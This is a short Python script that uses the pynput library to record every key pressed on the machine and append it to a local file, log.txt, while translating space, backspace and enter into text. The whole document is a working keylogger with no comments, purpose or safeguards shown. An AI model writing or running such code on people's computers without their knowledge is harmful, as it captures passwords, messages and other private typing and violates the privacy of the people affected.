import pynput
from pynput.keyboard import Key, Listener


def on_keyPress(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.backspace':
        key = '\b'
    if key == 'Key.enter':
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)

  

with Listener(on_press=on_keyPress) as listener: 
    listener.join()